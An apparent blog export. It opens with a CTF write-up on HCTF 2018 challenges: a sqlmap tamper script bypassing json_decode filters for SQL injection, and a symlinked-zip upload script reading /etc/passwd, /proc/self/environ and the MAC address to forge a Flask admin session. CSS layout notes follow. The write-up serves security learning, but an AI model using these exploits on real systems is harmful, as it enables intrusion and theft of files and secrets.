    <content type="text"><![CDATA[近来有时间补了一下之前比赛遗留下来的wp Kzone仿的一个qq空间的钓鱼站，www.zip下载源码后，尝试各个功能点审计，动态调试后，发现正常登录的功能点不会设置一个名为`login_data`参数的cookie，而这个点可以用来登录， 也算是出题人后来加上的功能点，然后将其当成考点？ 登录的时候是不会自动带上这个参数的：我们手动设置后，然后将其导入到浏览器cookie中，可以用这个cookie登录。 其过程为：在后台登录前，会包含一个共有的文件： 这里重点关注member.php： 使用cookie登录的数据会进行一次json_decode解码： 这里学习了有的师傅使用了json_decode()会unicode自动解码的特性绕过。 嫖了一个tamper脚本1234567891011121314151617181920212223242526#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): data = &apos;&apos;&apos;&#123;&quot;admin_user&quot;:&quot;%s&quot;&#125;;&apos;&apos;&apos; payload = payload.lower() payload = payload.replace(&apos;u&apos;, &apos;\u0075&apos;) payload = payload.replace(&apos;o&apos;, &apos;\u006f&apos;) payload = payload.replace(&apos;i&apos;, &apos;\u0069&apos;) payload = payload.replace(&apos;\&apos;&apos;, &apos;\u0027&apos;) payload = payload.replace(&apos;\&quot;&apos;, &apos;\u0022&apos;) payload = payload.replace(&apos; &apos;, &apos;\u0020&apos;) payload = payload.replace(&apos;s&apos;, &apos;\u0073&apos;) payload = payload.replace(&apos;#&apos;, &apos;\u0023&apos;) payload = payload.replace(&apos;&gt;&apos;, &apos;\u003e&apos;) payload = payload.replace(&apos;&lt;&apos;, &apos;\u003c&apos;) payload = payload.replace(&apos;-&apos;, &apos;\u002d&apos;) payload = payload.replace(&apos;=&apos;, &apos;\u003d&apos;) payload = payload.replace(&apos;f1a9&apos;, &apos;F1a9&apos;) payload = payload.replace(&apos;f1&apos;, &apos;F1&apos;) return data % payload python sqlmap.py -r jsondecode --tamper &quot;jsondecodeBypassTamper.py&quot; -v 3 --dbs --dbms=mysql --level 2 然鹅预期解是读install.sql，会发现数据表引擎使用的是innodb。MySQL 5.7 之后的版本，在其自带的 mysql 库中，新增了 innodb_table_stats 和 innodb_index_stats 这两张日志表。如果数据表的引擎是innodb ，则会在这两张表中记录表、键的信息。 因为过滤了or，所以布尔盲注的时候利用setcookie次数造成的差异进行注入。 造成布尔盲注的流程：如果查询用户名不为空，且密码和数据库中哈希进行弱类型比较绕过成功，则登录成功。如果查询用户名为空，当然此时密码肯定也不会和空相等，所以会有四次set-cookie 当然也可以在密码一直比较错误的情形下利用：用户名字段查询不到东西(为空)：set-cookie四次用户名字段查询到东西：set-cookoe两次 HideAndSeek注册后题目是一个上传zip文件的地方，会自动解压并渲染出文件内容。奇怪的是提交完之后直接就在这样一个http://206.189.144.143:20000/upload路径下渲染了，也没有具体的文件名等信息。 如果再去访问upload会进行跳转，所以猜测是渲染一次之后就删了。尝试构造文件名../../../../../../etc/passwd的压缩文件(瞎试的)，返回一片空白..其次压缩文件里有目录结构，也会返回空白。 网上找到一篇文件上传软连接的文章：https://xz.aliyun.com/t/2589 构造软连接压缩文件 zip -y 表示存储链接文件，不会替代源文件 上传压缩文件后得到： 现在有了一个任意文件读取，接下来得猜测目录,尝试读取proc伪文件`/proc/self/cwd 读不到东西，猜想原因如下： 再试试读环境变量：/proc/self/environ,这里读到了很多相关文件信息 再读一下：/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini 知识面太窄了，没接触过flask，后来才知道这是源码路径：/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 反正源码就大概在/app目录下，之后就是脑洞和经验了.. wp说由cookie可以猜到是flask，然后提示用的docker，默认在/app/main.py，所以去读/app/main.py12345678910111213141516171819import sysfrom flask import Flaskapp = Flask(__name__)@app.route(&quot;/&quot;)def hello(): version = &quot;&#123;&#125;.&#123;&#125;&quot;.format(sys.version_info.major, sys.version_info.minor) message = &quot;Hello World from Flask in a uWSGI Nginx Docker container with Python &#123;&#125; (default)&quot;.format( version ) return messageif __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, debug=True, port=80) 读出源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# -*- coding: utf-8 -*-from flask import Flask,session,render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100)app.config[&apos;UPLOAD_FOLDER&apos;] = &apos;./uploads&apos;app.config[&apos;MAX_CONTENT_LENGTH&apos;] = 100 * 1024ALLOWED_EXTENSIONS = set([&apos;zip&apos;])def allowed_file(filename): return &apos;.&apos; in filename and \ filename.rsplit(&apos;.&apos;, 1)[1].lower() in ALLOWED_EXTENSIONS@app.route(&apos;/&apos;, methods=[&apos;GET&apos;])def index(): error = request.args.get(&apos;error&apos;, &apos;&apos;) if(error == &apos;1&apos;): session.pop(&apos;username&apos;, None) return render_template(&apos;index.html&apos;, forbidden=1) if &apos;username&apos; in session: return render_template(&apos;index.html&apos;, user=session[&apos;username&apos;], flag=flag.flag) else: return render_template(&apos;index.html&apos;)@app.route(&apos;/login&apos;, methods=[&apos;POST&apos;])def login(): username=request.form[&apos;username&apos;] password=request.form[&apos;password&apos;] if request.method == &apos;POST&apos; and username != &apos;&apos; and password != &apos;&apos;: if(username == &apos;admin&apos;): return redirect(url_for(&apos;index&apos;,error=1)) session[&apos;username&apos;] = username return redirect(url_for(&apos;index&apos;))@app.route(&apos;/logout&apos;, methods=[&apos;GET&apos;])def logout(): session.pop(&apos;username&apos;, None) return redirect(url_for(&apos;index&apos;))@app.route(&apos;/upload&apos;, methods=[&apos;POST&apos;])def upload_file(): if &apos;the_file&apos; not in request.files: return redirect(url_for(&apos;index&apos;)) file = request.files[&apos;the_file&apos;] if file.filename == &apos;&apos;: return redirect(url_for(&apos;index&apos;)) if file and allowed_file(file.filename): filename = secure_filename(file.filename) file_save_path = os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename) if(os.path.exists(file_save_path)): return &apos;This file already exists&apos; file.save(file_save_path) else: return &apos;This file is not a zipfile&apos; try: extract_path = file_save_path + &apos;_&apos; os.system(&apos;unzip -n &apos; + file_save_path + &apos; -d &apos;+ extract_path) read_obj = os.popen(&apos;cat &apos; + extract_path + &apos;/*&apos;) file = read_obj.read() read_obj.close() os.system(&apos;rm -rf &apos; + extract_path) except Exception as e: file = None os.remove(file_save_path) if(file != None): if(file.find(base64.b64decode(&apos;aGN0Zg==&apos;).decode(&apos;utf-8&apos;)) != -1): return redirect(url_for(&apos;index&apos;, error=1)) return Response(file)if __name__ == &apos;__main__&apos;: #app.run(debug=True) app.run(host=&apos;127.0.0.1&apos;, debug=True, port=10008) 看到他import了flag，直接去读flag，然鹅..直接被拦了 所以现在思路就是越权成为admin，这里使用的一个固定的随机数种子，uuid.getnode()获得10进制mac地址，可以在/sys/class/net/eth0/address读到mac地址，所以可以伪造session越权称为admin， 读到mac地址：02:42:ac:11:00:02，在线转成10进制：https://www.vultr.com/tools/mac-converter/?mac_address=02%3A42%3Aac%3A11%3A00%3A02得到种子：2485377892354 然后本地搭一下flask环境拿到session即可得到flag。 最后看了其他师傅们的wp，还可以读.bash_history等等，这里嫖了一个exp(我全程手动操作的..)1234567891011121314151617181920212223242526272829303132333435363738394041import requestsimport random import osimport stringimport timeimport zipfileimport sysdef generate_zip(path,i): zip_name = &apos;moxiaoxi&apos;+str(i)+&apos;.zip&apos; link_namme = &apos;moxiaoxi&apos;+str(i) os.system(&quot;ln -s &#123;&#125; &#123;&#125;&quot;.format(path,link_namme)) print &quot;ln -s &#123;&#125; &#123;&#125;&quot;.format(path,link_namme) os.system(&quot;zip -y &#123;&#125; &#123;&#125;&quot;.format(zip_name,link_namme)) with open(zip_name,&apos;r&apos;) as f: data = f.read() return zip_name,datadef exp(path,i): zip_name,data = generate_zip(path,i) # zip_name,data = rewrite(path,i) session = requests.Session() paramsPost = &#123;&quot;submit&quot;:&quot;Submit&quot;&#125; paramsMultipart = [(&apos;the_file&apos;, (zip_name, data, &apos;application/zip&apos;))] headers = &#123;&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Linux; Android 9.0; SAMSUNG-SM-T377A Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Mobile Safari/537.36&quot;,&quot;Referer&quot;:&quot;http://hideandseek.2018.hctf.io/&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;DNT&quot;:&quot;1&quot;&#125; cookies = &#123;&quot;session&quot;:&quot;eyJ1c2VybmFtZSI6Im1veGlhb3hpIn0.Dsf5zA.yM84QphtcfEoykAu2lwjxp7_QvI&quot;&#125; response = session.post(&quot;http://hideandseek.2018.hctf.io/upload&quot;, data=paramsPost, files=paramsMultipart, headers=headers, cookies=cookies) print(&quot;Status code: %i&quot; % response.status_code) print(&quot;Response body: %s&quot; % response.content) if len(response.content)&gt;5: # print(&quot;Response body: %s&quot; % response.content) with open(&apos;out.txt&apos;,&apos;a+&apos;) as f: f.write(&apos;\n\n&#123;&#125;\n\n&#123;&#125;&apos;.format(path,response.content)) if __name__==&apos;__main__&apos;: name = &apos;test&apos;+&apos;&apos;.join(random.sample(string.ascii_letters + string.digits, 4)) exp(sys.argv[1],name)]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS Tricks]]></title>
    <url>%2F2019%2F01%2F29%2FCSS%20Tricks%2F</url>
    <content type="text"><![CDATA[接上一篇文章，学习css中踩的坑，一些小的知识点汇总，wiki的前端设计也总算是可以告一段落了，效果图： 水平/垂直居中总结：行内元素: 用text-align:center居中，用line-height垂直居中； 块状元素: 用margin: 0 auto水平居中，垂直居中用：display:table-cell; vertical-align:middle。如果已设块状元素高度，可以将margin-top和margin-bottom设为：(父元素高度-子元素高度)/2； 水平垂直同时居中还有一种办法，将父元素position设为relative，该元素设为absolute，然后margin:auto即可。 other:实际开发中遇到的一个问题，使用了绝对定位交叉轴位置(设置了top),如果此时想实现在水平自动定位的话，得给他加一个子标签，然后用margin: 0 auto,父标签记得设置宽度width: 100% 还有一种办法即,子盒子设百分比宽高，边距用相对的position调整123456789101112.feature-3&#123; width: 100%; height: 1000px; &#125;.feature-3 .feature-box&#123; width: 72%; height: 90%; margin: 0 auto; position: relative; top: 25px;&#125; 参考： http://www.cnblogs.com/chaixiaozhi/p/8490725.html input标签透明background-color: transparent; 背景图高度自适应问题我们想让一个背景图纵向填充整个屏幕, 要先将其父元素全部使用高度100%自适应，这样子元素才会生效12345678910html,body&#123; height: 100%;&#125;.menu&#123; height: 100%; width: 100px; background: url(&apos;image/Base.png&apos;); &#125; 字体图片在列表中对不齐时 给每个图指定宽度，垂直居中即可12345678910111213img&#123; width: 18px; vertical-align:middle;//指定行内元素（inline）或表格单元格（table-cell）元素的垂直对齐方式。 margin-right: 5px;&#125;&lt;dl&gt; &lt;dt&gt;YOUR PEODUCTS &lt;img src=&quot;image/Settings.png&quot; alt=&quot;&quot;&gt;&lt;/dt&gt; &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Book of Wisdom.png&quot; alt=&quot;&quot;&gt; Book&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Video Camera.png&quot; alt=&quot;&quot;&gt; Tutorials&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Chart.png&quot; alt=&quot;&quot;&gt; Stocks&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;image/Painting.png&quot; alt=&quot;&quot;&gt; Infographics&lt;/a&gt;&lt;/dd&gt;&lt;/dl&gt; 将非可点击的元素设置悬停由鼠标指针变成手cursor: pointer; 搜索框写法12345678910111213141516171819202122232425262728293031323334353637383940.search&#123; height: 70px; width: 100%; border-bottom: 1px solid #ccc; border-right: 1px solid #ccc; position: absolute; top:0;&#125;.search .search-box&#123; display: block; width: 340px; height: 35px; margin: 0 auto; margin-top: 17.5px; /*居中的另外一种写法，(父元素高-子元素高)/2*/ margin-bottom: 17.5px; border: 1px solid rgba(0, 0, 0, 0.1); border-radius: 8px; text-indent: 1em; &#125;.search .search-box .m-search&#123; height: 100%; width: 85%; outline: none; /*关闭聚焦时的外框*/&#125;.search .search-box img&#123; width: auto; height: auto; position: relative; top:3px; left: 2px; cursor: pointer; /*悬停变成小手*/&#125;&lt;div class=&quot;search&quot;&gt; &lt;div class=&quot;search-box&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;m-search&quot; placeholder=&quot;Search&quot;&gt; &lt;img src=&quot;image/Search icon.png&quot; alt=&quot;&quot;&gt; &lt;/div&gt;&lt;/div&gt; 给图片加悬浮阴影效果 两个图片放入同一个父盒子，将hover效果图利用定位，定位到和初始图一个位置，设好hover效果图初始为不可见，然后用:hover改变透明度。 1234567891011121314151617181920.team-name&#123; margin: 10px 10px; position: relative;&#125;.team-name .cover&#123; opacity: 0; /*将覆盖的图设为不可见*/ position: absolute; /*将覆盖图和原始图定位到同一个位置*/ top: 0; bottom: 0; left: 0; right: 0; z-index: 1;&#125;.team-name:hover .cover&#123; opacity: 0.9; &#125;&lt;div class=&quot;team-name&quot;&gt; &lt;img src=&quot;images/Userpic-1.jpg&quot; alt=&quot;&quot;&gt;&lt;!--初始图--&gt; &lt;div&gt;&lt;img class=&quot;cover&quot; src=&quot;images/active.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;!--hover后覆盖的图--&gt;&lt;/div&gt; 完整效果：悬浮阴影效果.gif 实现边线上加文字效果 1234567891011121314.line&#123; height: 1px; text-align: center; /*让span中间文字到中间*/ border: 1px solid #ccc; &#125;.line span&#123; position: relative; top: -12px; /*移动到线上*/ font-size: 14px; color: #7f8fa4; background: white; padding: 0 20px; &#125; &lt;div class=&quot;line&quot;&gt;&lt;span&gt;↑ 安全客推送 ↑&lt;/span&gt;&lt;/div&gt; 在元素盒子前加上小光点使用::before伪元素，使用负的left移到盒子前面。123456789101112.choose::before&#123; content: &quot;&quot;; position: absolute; border-radius: 100px; display: block; box-shadow: 1px 0 5px 2px #214e74; width: 2px; height: 4px; background-color: #2399f1; top: 60px; left: -29px; &#125; 左右两栏固定布局方法 使用float布局 1234567891011121314 .left-float&#123; float: left; width: 30%; height: 100px; background: rgb(17, 0, 255); &#125; .right-float&#123; float:right; width: 70%; height: 100px; background: rgb(77, 209, 77); &#125;&lt;div class=&quot;left-float&quot;&gt;left-float/div&gt;&lt;div class=&quot;right-float&quot;&gt;right-float&lt;/div&gt; 使用flex进行布局(好用！) 12345678910111213141516.flex&#123; display: flex;&#125;.left-flex&#123; flex:3; background:hotpink&#125;.right-flex&#123; flex:7; background:khaki;&#125;&lt;div class=&quot;flex&quot;&gt; &lt;div class=&quot;left-flex&quot;&gt;left-flex&lt;/div&gt; &lt;div class=&quot;right-flex&quot;&gt;right-flex&lt;/div&gt;&lt;/div&gt; 使用绝对定位布局(不推荐) 1234567891011121314151617.left-position&#123; position:absolute; top: 100px; left: 0; width: 30%; background:rgb(0, 140, 255);&#125;.right-position&#123; position:absolute; right: 0; top: 100px; width:70%; background: rgb(202, 127, 30);&#125;&lt;div class=&quot;left-position&quot;&gt;left-position&lt;/div&gt;&lt;div class=&quot;right-position&quot;&gt;right-position&lt;/div&gt; 左固定右动态的两列布局 float+BFC方法123456789101112131415.left-float&#123; float: left; width:200px; height: 500px; color: black; background: rgb(228, 139, 23);&#125;.right-float&#123; background: red; height: 500px; margin-left: 205px;&#125;&lt;div class=&quot;left-float&quot;&gt;left&lt;/div&gt;&lt;div class=&quot;right-float&quot;&gt;right&lt;/div&gt; absolute + margin-left 1234567891011121314 .left-absolute&#123; position: absolute; width: 200px; height: 500px; left:0; background: rgb(255, 187, 0); &#125; .right-absolute&#123; margin-left: 205px; height: 500px; background: red; &#125;&lt;div class=&quot;left-absolute&quot;&gt;left-absolute&lt;/div&gt;&lt;div class=&quot;right-absolute&quot;&gt;right-absolute&lt;/div&gt; flex(好用！) 12345678910111213.left-flex&#123; flex: 0 0 200px; background: red; &#125;.right-flex&#123; flex: 1 1 auto; background: green;&#125;&lt;div class=&quot;flex&quot;&gt; &lt;div class=&quot;left-flex&quot;&gt;left-flex&lt;/div&gt; &lt;div class=&quot;right-flex&quot;&gt;right-flex&lt;/div&gt;&lt;/div&gt; flex: 0 0 200px：表示值为固定200px，不和其他元素成比例关系，同时宽度不够时也不会收缩，即固定。 margin 为负值的用法 margin的参考线有两类，一类是top、left，它们以外元素作为参考线，另一类是right、bottom，它们以自身作为参考线。简单点说就是： top负值就是以包含块(Containing block) 内容区域的上边或者上方相连元素 margin 的下边为参考线; left负值就是以包含块(Containing block) 内容区域的左边或者左方相连元素 margin 的右边为参考线; right负值就是以元素本身border的右边为参考线； bottom负值就是以元素本身border的下边为参考线； 双飞翼布局即三栏布局，两边盒子固定，中间盒子自适应的布局123&lt;div class=&quot;col-main&quot;&gt;我是主列&lt;/div&gt;&lt;div class=&quot;col-sub&quot;&gt;我是子列&lt;/div&gt;&lt;div class=&quot;col-extra&quot;&gt;我是附加列&lt;/div&gt; 这样写dom，浏览器加载顺序依次为：主列、子列、附加列。但是我们要的效果是左边为子列，中间为主列，右边为附加列。 而且我们要的效果是左右两边盒子宽度固定，中间自适应(width:100%)，缩放页面时宽度不小于700px(给body加个最小宽度) 这里可以使用margin为负的布局，使得主列在中间，子列和附加列在左右。1234567891011121314151617181920212223.col-main&#123; float: left; width: 100%; background:red;&#125;.col-sub&#123; float: left; width: 190px; margin-left: -100%; background:green;&#125;.col-extra&#123; float: left; width: 190px; margin-left: -190px; background: blue;&#125;&lt;div class=&quot;demo&quot;&gt; &lt;div class=&quot;col-main&quot;&gt;我是主列&lt;/div&gt; &lt;div class=&quot;col-sub&quot;&gt;我是子列&lt;/div&gt; &lt;div class=&quot;col-extra&quot;&gt;我是附加列&lt;/div&gt;&lt;/div&gt; 初步的布局已经成形了，但是主列的文字被子列挡住了，这时候可能会想着在主列的css上加margin-left，因为我们子列的布局是靠着主列的右边线定位的，直接加的话会影响到整体布局，这里有几种实现办法： 在主列内建一个盒子，设置该盒子的margin-left/rightdemo:1234567891011121314151617181920212223242526272829303132.main&#123; float: left; width:100%; height: 600px;; background: rgb(16, 149, 202);&#125;.left&#123; float: left; margin-left: -100%; width: 200px; height: 600px; background: rgb(130, 47, 214);&#125;.right&#123; float: left; width: 200px; margin-left: -200px; height: 600px; background: rgb(255, 217, 0);&#125;.wrap&#123; margin: 0 200px;&#125;body&#123; min-width: 700px; /*设置最小宽度*/&#125;&lt;!-- 使用相对定位来解决中间盒子显示问题 --&gt;&lt;div class=&quot;main&quot;&gt; &lt;div class=&quot;wrap&quot;&gt;main&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;&lt;div class=&quot;right&quot;&gt;right&lt;/div&gt; 使用相对定位先给三列的父容器设置一个左右200px的padding，将三列压扁，然后给左右列设一个相对定位padding空出来的位置填满。即可让主列元素全部显示出来。 12345678910111213141516171819202122232425262728293031.col-main&#123; float: left; width: 100%; background:red;&#125;.col-sub&#123; float: left; width: 190px; margin-left: -100%; background:green; position: relative; left: -200px;&#125;.col-extra&#123; float: left; width: 190px; margin-left: -190px; background: blue; position: relative; right:-200px;&#125;.demo&#123; padding: 0 200px;&#125;&lt;div class=&quot;demo&quot;&gt; &lt;div class=&quot;col-main&quot;&gt;我是主列&lt;/div&gt; &lt;div class=&quot;col-sub&quot;&gt;我是子列&lt;/div&gt; &lt;div class=&quot;col-extra&quot;&gt;我是附加列&lt;/div&gt;&lt;/div&gt; 三栏布局 上述说的双飞翼(margin负值法)布局 绝对定位法左右宽度固定，采用绝对定位，中间主体用margin撑开。不好用。 自身浮动法左右标签，分别左右浮动，主列标签放最后实现自适应。 123456789101112131415161718192021222324html,body&#123; height: 100%; margin: 0;&#125;.left&#123; width: 100px; height: 100%; float: left; background:rgb(223, 85, 21);&#125;.middle&#123; background:rgb(28, 113, 211); height: 100%; margin: 0 120px;&#125;.right&#123; width: 100px; height: 100%; float: right; background: rgb(27, 156, 81);&#125;&lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;&lt;div class=&quot;right&quot;&gt;right&lt;/div&gt;&lt;div class=&quot;middle&quot;&gt;middle(这个一定要放最后)&lt;/div&gt;]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS-前端学习记录]]></title>
    <url>%2F2019%2F01%2F29%2FCSS-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[想个小组wiki写个炫酷的前端，这半个月来一直在不断的练习前端开发，分享一些自己学习过程的记录~ 选择器 标签选择器p{font-size: 12px} 类选择器.class{font-size: 12px}绑定标签的class属性，可以重复 ID选择器#id{font-size: 12px}绑定标签的id属性，不能重复 子选择器.food&gt;li{border:1px}选择food类中的li标签，只能选择直接后代(第一代后代) 包含后代选择器.first span{color:red}即选择first类里的span标签，所有后代都可以 通用选择器* {color: red;} 伪选择器a:hover{color:red;}即鼠标滑过时触发的选择器，这里使a标签里的文字变红 分组选择器h1,span{color: red}选住全部h1和span标签 相邻选择器div+p 选择紧着在&lt;div&gt;元素后的&lt;p&gt; 注意和包含后代选择器/子选择器的区别为，它们选择的是包含在其中的元素，而+号选择器选择的是同级别关系的 通用选择器A ~ B:匹配B元素，B是A之后兄弟节点中任意一个。 文本样式： 字体font-family: &quot;宋体&quot;;font-family:&quot;Microsoft Yahei&quot;; 字号font-size: 12px字体大小单位有： px：像素值，绝对单位 em：1em相当于当前元素的父元素的大小 rem: 1rem相对于根元素()的字体大小 所以一般我们将&lt;html&gt;元素的font-size设为一个固定的px值，之后的段落基于rem来变化即可。 3.颜色color: red 粗体大小font-weight: normal | bold | lighter | border normal: 普通 bold: 加粗 更细或更粗 字体样式font-style: normal | italic | oblique normal: 设置为普通字体(若存在斜体则关闭) italic: 设置斜体 文本装饰text-decoration:line-through参数：none 默认。定义标准的文本。underline 定义文本下的一条线。overline 定义文本上的一条线。line-through 定义穿过文本下的一条线。blink 定义闪烁的文本。inherit 规定应该从父元素继承 text-decoration 属性的值。 demo：同时添加上下划线1text-decoration: underline overline; 字体转换text-transform: none | uppercase | lowercase | capitalize | full-width none: 防止任何转型。 uppercase: 将所有文本转为大写。 lowercase: 将所有文本转为小写。 capitalize: 转换所有单词让其首字母大写。 full-width: 将所有字形转换成固定宽度的正方形，类似于等宽字体，允许对齐。拉丁字符以及亚洲语言字形（如中文，日文，韩文） 嵌入字体加载服务端的字体文件，让浏览器可以显示用户电脑没有的字体 1234@font-face &#123; font-family : 字体名称; src : 字体文件在服务器上的相对或绝对路径;&#125; 文本阴影text-shadow: X-Offset Y-Offset blur color;X-Offset：表示阴影的水平偏移距离，其值为正值时阴影向右偏移，反之向左偏移； Y-Offset：是指阴影的垂直偏移距离，如果其值是正值时，阴影向下偏移，反之向上偏移； Blur：是指阴影的模糊程度，其值不能是负值，如果值越大，阴影越模糊，反之阴影越清晰，如果不需要阴影模糊可以将Blur值设置为0； Color：是指阴影的颜色，其可以使用rgba色。demo: text-shadow: 2px 2px 0 red 文本对齐text-align: left | right | center | justify分别为：左对齐文本 | 右对齐 | 居中 | 使文本展开，使行宽相同 行距line-height: 1.5支持大多数单位，也可以无单位，作为乘数，乘以font-size。一般设置为盒子模型的height值，可以起到垂直居中作用。 单词和字母间距letter-spacing:word-spacing: 缩进text-indent:2em给段落开头缩进2em，即两个文字的空白 行间距line-height: 1.5em 字间距letter-spacing: 50px (段落)对齐text-align: center 缩写：12345678910111213body&#123; font-style:italic; font-variant:small-caps; font-weight:bold; font-size:12px; line-height:1.5em; font-family:&quot;宋体&quot;,sans-serif;&#125;缩写为：body&#123; font:italic small-caps bold 12px/1.5em &quot;宋体&quot;,sans-serif;&#125; textarea标签相关属性 控制元素大小可调整性：resize123456789101112/* Keyword values */resize: none; /*默认*/resize: both;resize: horizontal;resize: vertical;resize: block;resize: inline;/* Global values */resize: inherit;resize: initial;resize: unset; 背景 基本内容background 背景色: background-color: red 背景图像：background-image: url(http://img) 背景重复：background-repeat: no-repeat | repeat-x | repreat-y | repeat效果分别为，不重复 | 水平重复 | 垂直重复 | 都重复 背景位置：background-position: px | rems | % | center | left | right | top | bottom 渐变：background-imagebackground-image: linear-gradient(to bottom, yellow, orange 40%, yellow)使用渐变函数:linear-gradient()传入渐变方向(to bottom | to right | to bottom right等), 渐变色。 重复渐变background-image: repeating-linear-gradient(to right, yellow, orange 25px, yellow 50px);0-&gt;50%，50%-&gt;100%周期渐变 背景附着：background-attachment: scroll | fixed | local内容滚动时，背景显示的效果。demo:https://github.com/mdn/learning-area/tree/master/css/styling-boxes/backgrounds 简写：background: yellow linear-gradient(to bottom, orange, yellow) no-repeat left center scroll; 背景大小: background-sizebackground-size: auto | &lt;长度值&gt; | &lt;百分比&gt; | cover | contain auto：默认值，不改变背景图片的原始高度和宽度；&lt;长度值&gt;：成对出现如200px 50px，将背景图片宽高依次设置为前面两个值，当设置一个值时，将其作为图片宽度值来等比缩放； &lt;百分比&gt;：0％~100％之间的任何值，将背景图片宽高依次设置为所在元素宽高乘以前面百分比得出的数值，当设置一个值时同上； cover：顾名思义为覆盖，即将背景图片等比缩放以填满整个容器； contain：容纳，即将背景图片等比缩放至某一边紧贴容器边缘为止。 背景源：background-originbackground-origin: border-box | padding-box | content-box;参数分别表示背景图片是从边框，还是内边距（默认值），或者是内容区域开始显示。 背景剪切： background-clipbackground-clip ： border-box | padding-box | content-box | no-clip参数分别表示从边框、或内填充，或者内容区域向外裁剪背景。no-clip表示不裁切，和参数border-box显示同样的效果。backgroud-clip默认值为border-box。 如果要剪切成圆形，则写一个 border-radius,然后在这个盒子中赋一个背景图即可。 盒子模型块状模型都具备盒子模型的特征 盒子模型边框粗细：border-width: 2px样式：border-style:solid,常见的值有: dashed (虚线)|dotted(点线)|solid(实线)颜色：border-color: red 可以简写为：border: 2px solid red如果只想设置底边：border-bottom: 2px solid red，其他边同理：border-top | border-right | border-left 边框圆角border-radius:10px;border-radius: 5px 4px 3px 2px; /*四个半径值分别是左上角、右上角、右下角和左下角，顺时针 */ demo:半圆1234567div.circle&#123; height:50px width:100px; background:#9da; border-radius:50px 50px 0 0 ; &#125;&lt;div class=&quot;circle&quot;&gt;&lt;/div&gt; 边框阴影(box-shadow)box-shadow: X轴偏移量 Y轴偏移量 [阴影模糊半径] [阴影扩展半径] [阴影颜色] [投影方式]; 不同浏览器适配：123 -webkit-box-shadow:;-moz-box-shadow:;box-shadow:; 盒子模型宽和高几个关键参数： 宽：width 填充：padding 边框：border 边界：margin 同样也可以设置顶底左右的距离,如：padding-top等等,简写：top、right、bottom、left值相同：margin:10px 10px 10px 10px; =&gt;margin: 10pxtop和bottom，left和right相同:margin:10px 20px 10px 20px;=&gt;margin:10px 20px; 如果left和right相同：margin:10px 20px 30px 20px;可缩写为：margin:10px 20px 30px; 溢流:overflow: auto | hidden | visible auto: 溢出盒子的内容将被隐藏，出现滚动条 hidden: 溢出的内容隐藏 visible: 溢出的内容显示在盒子外边 轮廓：Outline 盒子模型：box-sizingbox-sizing: content-box | border-box | inherit设置成border-box后，即margin，padding这些不会再影响width和height的总长。 盒子元素类型转换转换为内联元素：display:inline转化为块状元素：display:block转化为内联块状元素：display: inline-block 还有一些其他的显示类型： display: table: 可以像处理table布局哪样处理非table元素。 display: flex：可以布置一些弹性等宽容器，或者垂直居中内容等 display: grid：css网格。 盒子宽和高的约束 demo: 父容器在最大和最小的限制内，它将填满整个视图，父小于1280px，布局保持1280px，小于480px，则滚动才能看到全部内容。1234width: 70%max-width: 1280px;min-width: 480px;margin: 0 auto; /*在父容器中上下边距为0，左右居中*/ demo2: 将图像/视频，限制在容器内部123display: block;margin: 0 auto;max-width: 100%; /*父容器缩小到小于图像宽度，图像会一起缩小*/ 样式列表 列表特定样式作用在&lt;ul&gt;和&lt;ol&gt;元素上： 列表项目符号的类型：list-style-type: upper-roman | none | square (大写的罗马字，或者方形符号,或者没有) 符号在列表项内还是外： list-style-position: inside | outside(默认) 项目符号自定义图片：list-style-image: url(star.svg) 简写：list-style: square url() inside; 管理列表计数 start：从1以外的数字开始计数demo: 从4开始计数 123456&lt;ol start=&quot;4&quot;&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;li&gt;6&lt;/li&gt; &lt;li&gt;7&lt;/li&gt;&lt;/ol&gt; reversed: 列表倒计数 1234&lt;ol start=&quot;4&quot; reversed&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;3&lt;/li&gt;&lt;/ol&gt; value: 设置列表项指定数值 1234&lt;ol&gt; &lt;li value=&quot;2&quot;&gt;2&lt;/li&gt; &lt;li value=&quot;10&quot;&gt;10&lt;/li&gt;&lt;/ol&gt; 链接 链接状态每一个状态都对应的伪类来应用样式 Link(未访问过的): 